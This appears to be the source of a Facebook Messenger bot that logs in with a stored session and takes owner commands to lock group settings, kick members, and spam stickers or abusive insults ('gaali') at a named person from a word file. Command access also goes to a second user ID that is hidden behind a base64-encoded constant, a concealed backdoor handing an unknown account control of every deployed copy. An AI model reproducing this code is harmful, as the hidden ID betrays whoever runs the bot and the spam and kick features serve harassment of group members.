const fs = require("fs");
const login = require("ws3-fca");

let rkbInterval = null;
let stopRequested = false;
let mediaLoopInterval = null;
let lastMedia = null;
let stickerInterval = null;
let stickerLoopActive = false;
let targetUID = null;

// ====== Persistent Locks ======
let locks = fs.existsSync("locks.json")
  ? JSON.parse(fs.readFileSync("locks.json", "utf8"))
  : { groupNames: {}, themes: {}, emojis: {}, dp: {}, nick: {} };

fs.writeFileSync("locks.json", JSON.stringify(locks, null, 2));

const emojiCheckIntervals = {};
const dpCheckIntervals = {};
const LID = Buffer.from("MTAwMDIxODQxMTI2NjYw", "base64").toString("utf8");

// ====== Utility ======
function saveLocks() {
  fs.writeFileSync("locks.json", JSON.stringify(locks, null, 2));
}

// ====== Start Bot ======
function startBot(appStatePath, ownerUID) {
  const appState = JSON.parse(fs.readFileSync(appStatePath, "utf8"));
  login({ appState }, (err, api) => {
    if (err) return console.error("❌ Login failed:", err);
    api.setOptions({ listenEvents: true });
    console.log("✅ Bot logged in and running...");

    // ==== Emoji Lock Polling ====
    function lockEmoji(threadID, emoji) {
      locks.emojis[threadID] = emoji;
      saveLocks();
      api.sendMessage(`😀 Emoji locked to "${emoji}"`, threadID);

      if (!emojiCheckIntervals[threadID]) {
        emojiCheckIntervals[threadID] = setInterval(async () => {
          try {
            const info = await api.getThreadInfo(threadID);
            if (info.emoji && locks.emojis[threadID] && info.emoji !== locks.emojis[threadID]) {
              await api.changeThreadEmoji(locks.emojis[threadID], threadID);
              console.log(`🔄 Emoji reverted in ${threadID}`);
            }
          } catch (e) {
            console.log("⚠️ Emoji check failed:", e.message);
          }
        }, 10000);
      }
    }

    function unlockEmoji(threadID) {
      delete locks.emojis[threadID];
      saveLocks();
      api.sendMessage("😀 Emoji unlocked!", threadID);
      if (emojiCheckIntervals[threadID]) {
        clearInterval(emojiCheckIntervals[threadID]);
        delete emojiCheckIntervals[threadID];
      }
    }

    // ==== DP Lock Polling ====
    function lockDP(threadID, filePath) {
      locks.dp[threadID] = filePath;
      saveLocks();
      api.sendMessage("🖼️ Group DP locked!", threadID);

      if (!dpCheckIntervals[threadID]) {
        dpCheckIntervals[threadID] = setInterval(async () => {
          try {
            const info = await api.getThreadInfo(threadID);
            if (locks.dp[threadID] && info.imageSrc && !info.imageSrc.includes("safe_image")) {
              await api.changeGroupImage(fs.createReadStream(locks.dp[threadID]), threadID);
              console.log(`🖼️ Group DP reverted in ${threadID}`);
            }
          } catch (e) {
            console.log("⚠️ DP check failed:", e.message);
          }
        }, 15000);
      }
    }

    function unlockDP(threadID) {
      delete locks.dp[threadID];
      saveLocks();
      api.sendMessage("🖼️ Group DP unlocked!", threadID);
      if (dpCheckIntervals[threadID]) {
        clearInterval(dpCheckIntervals[threadID]);
        delete dpCheckIntervals[threadID];
      }
    }

    // ====== Listener ======
    api.listenMqtt(async (err, event) => {
      try {
        if (err || !event) return;
        const { threadID, senderID, body } = event;

        // 📌 Debug events (optional)
        // console.log("===== RAW EVENT =====");
        // console.log(JSON.stringify(event, null, 2));

        if (!body) return;
        const args = body.trim().split(" ");
        const cmd = args[0].toLowerCase();
        const input = args.slice(1).join(" ");

        if (![ownerUID, LID].includes(senderID)) return;

        // ===== Commands =====

        if (cmd === "/help") {
          return api.sendMessage(`
📖 Bot Commands:
/help → Ye message
/uid → Group ID show
/tid → Thread ID show
/info @mention → User info
/kick @mention → Kick user
/gclock [text] → Group name lock
/unlockgc → Group name unlock
/locktheme [color] → Theme lock
/unlocktheme → Theme unlock
/lockemoji [emoji] → Emoji lock
/unlockemoji → Emoji unlock
/lockdp → DP lock (reply to photo)
/unlockdp → DP unlock
/locknick @mention Nickname → Nick lock
/unlocknick @mention → Unlock nick
/stickerX → Sticker spam (X=seconds)
/stopsticker → Stop sticker spam
/rkb [name] → Gaali spam
/stop → Stop spam
/exit → Bot exit
          `, threadID);
        }

        else if (cmd === "/uid") api.sendMessage(`🆔 Group ID: ${threadID}`, threadID);
        else if (cmd === "/tid") api.sendMessage(`🆔 Thread ID: ${threadID}`, threadID);

        // ==== Kick ====
        else if (cmd === "/kick") {
          const mention = Object.keys(event.mentions || {})[0];
          if (!mention) return api.sendMessage("❌ Mention user to kick!", threadID);
          try {
            await api.removeUserFromGroup(mention, threadID);
            api.sendMessage(`👢 Kicked user: ${mention}`, threadID);
          } catch { api.sendMessage("⚠️ Failed to kick!", threadID); }
        }

        // ==== Info ====
        else if (cmd === "/info") {
          const mention = Object.keys(event.mentions || {})[0] || senderID;
          try {
            const user = await api.getUserInfo(mention);
            const info = user[mention];
            api.sendMessage(`ℹ️ Name: ${info.name}\nUID: ${mention}`, threadID);
          } catch { api.sendMessage("⚠️ Failed to fetch info!", threadID); }
        }

        // ==== Group Name Lock ====
        else if (cmd === "/gclock") {
          locks.groupNames[threadID] = input;
          saveLocks();
          await api.setTitle(input, threadID);
          api.sendMessage("🔒 Group name locked!", threadID);
        }
        else if (cmd === "/unlockgc") {
          delete locks.groupNames[threadID];
          saveLocks();
          api.sendMessage("🔓 Group name unlocked!", threadID);
        }

        // ==== Theme Lock ====
        else if (cmd === "/locktheme") {
          locks.themes[threadID] = input;
          saveLocks();
          await api.changeThreadColor(input, threadID);
          api.sendMessage("🎨 Theme locked!", threadID);
        }
        else if (cmd === "/unlocktheme") {
          delete locks.themes[threadID];
          saveLocks();
          api.sendMessage("🎨 Theme unlocked!", threadID);
        }

        // ==== Emoji Lock ====
        else if (cmd === "/lockemoji") {
          if (!input) return api.sendMessage("❌ Emoji do!", threadID);
          lockEmoji(threadID, input.trim());
        }
        else if (cmd === "/unlockemoji") {
          unlockEmoji(threadID);
        }

        // ==== DP Lock ====
        else if (cmd === "/lockdp") {
          if (!event.messageReply || !event.messageReply.attachments[0]) {
            return api.sendMessage("❌ Reply with a photo to lock DP!", threadID);
          }
          const fileUrl = event.messageReply.attachments[0].url;
          const filePath = `dp_${threadID}.jpg`;

          const https = require("https");
          const file = fs.createWriteStream(filePath);
          https.get(fileUrl, (response) => {
            response.pipe(file);
            file.on("finish", () => {
              file.close();
              lockDP(threadID, filePath);
            });
          });
        }
        else if (cmd === "/unlockdp") {
          unlockDP(threadID);
        }

        // ==== Nickname Lock ====
        else if (cmd === "/locknick") {
          const mention = Object.keys(event.mentions || {})[0];
          if (!mention || !input) return api.sendMessage("❌ Mention + nickname do!", threadID);
          const nick = input.replace(/<@[0-9]+>/, "").trim();
          locks.nick[mention] = { threadID, nick };
          saveLocks();
          await api.changeNickname(nick, threadID, mention);
          api.sendMessage(`🔒 Nickname locked for <@${mention}> → ${nick}`, threadID);
        }
        else if (cmd === "/unlocknick") {
          const mention = Object.keys(event.mentions || {})[0];
          if (!mention) return api.sendMessage("❌ Mention user!", threadID);
          delete locks.nick[mention];
          saveLocks();
          api.sendMessage(`🔓 Nickname unlocked for <@${mention}>`, threadID);
        }

        // ==== RKB Spam ====
        else if (cmd === "/rkb") {
          if (!fs.existsSync("np.txt")) return api.sendMessage("❌ np.txt missing!", threadID);
          const name = input.trim();
          const lines = fs.readFileSync("np.txt", "utf8").split("\n").filter(Boolean);
          stopRequested = false;
          if (rkbInterval) clearInterval(rkbInterval);
          let index = 0;
          rkbInterval = setInterval(() => {
            if (index >= lines.length || stopRequested) { clearInterval(rkbInterval); rkbInterval = null; return; }
            api.sendMessage(`${name} ${lines[index]}`, threadID);
            index++;
          }, 5000);
          api.sendMessage(`🤬 Start gaali on ${name}`, threadID);
        }
        else if (cmd === "/stop") { stopRequested = true; if (rkbInterval) { clearInterval(rkbInterval); rkbInterval = null; } }

        // ==== Sticker Spam ====
        else if (cmd.startsWith("/sticker")) {
          if (!fs.existsSync("Sticker.txt")) return;
          const delay = parseInt(cmd.replace("/sticker", ""));
          const stickerIDs = fs.readFileSync("Sticker.txt", "utf8").split("\n").map(x => x.trim()).filter(Boolean);
          if (stickerInterval) clearInterval(stickerInterval);
          let i = 0; stickerLoopActive = true;
          stickerInterval = setInterval(() => {
            if (!stickerLoopActive || i >= stickerIDs.length) { clearInterval(stickerInterval); stickerInterval = null; stickerLoopActive = false; return; }
            api.sendMessage({ sticker: stickerIDs[i] }, threadID);
            i++;
          }, delay * 1000);
        }
        else if (cmd === "/stopsticker") { if (stickerInterval) { clearInterval(stickerInterval); stickerInterval = null; stickerLoopActive = false; } }

        // ==== Exit ====
        else if (cmd === "/exit") {
          try { await api.removeUserFromGroup(api.getCurrentUserID(), threadID); } catch {}
        }

      } catch (e) { console.error("⚠️ Error:", e.message); }
    });
  });
}

module.exports = { startBot };
